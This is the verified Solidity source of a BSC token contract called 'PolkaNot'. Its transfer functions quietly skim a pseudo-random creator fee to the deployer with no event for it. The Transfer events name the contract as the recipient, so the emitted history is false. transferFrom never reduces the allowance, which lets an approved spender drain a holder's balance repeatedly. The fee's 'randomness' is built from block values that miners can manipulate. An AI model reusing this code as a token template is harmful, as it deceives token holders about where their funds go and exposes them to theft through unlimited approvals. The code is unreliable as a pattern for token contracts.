/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract PolkaNot {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1000000000 * 10 ** 8;
    string public name = "PolkaNot";
    string public symbol = "NOT";
    uint8 public decimals = 8;
    address public creator;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balances[msg.sender] = totalSupply;
        creator = msg.sender;
    }

    function balanceOf(address owner) public view returns(uint256) {
        return balances[owner];
    }

    function transfer(address to, uint256 value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');

        uint256 creatorFeePercent = getRandomCreatorFeePercent();
        uint256 creatorFeeAmount = value.mul(creatorFeePercent).div(10000);
        uint256 transferAmount = value.sub(creatorFeeAmount);

        balances[to] = balances[to].add(transferAmount);
        balances[creator] = balances[creator].add(creatorFeeAmount);
        balances[msg.sender] = balances[msg.sender].sub(value);

        emit Transfer(msg.sender, address(this), value);

        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');

        uint256 creatorFeePercent = getRandomCreatorFeePercent();
        uint256 creatorFeeAmount = value.mul(creatorFeePercent).div(10000);
        uint256 transferAmount = value.sub(creatorFeeAmount);

        balances[to] = balances[to].add(transferAmount);
        balances[creator] = balances[creator].add(creatorFeeAmount);
        balances[from] = balances[from].sub(value);

        emit Transfer(from, address(this), value);

        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function getRandomCreatorFeePercent() internal view returns (uint256) {
    uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, block.number))) % 6;
    return uint8(random) + 5;
}
}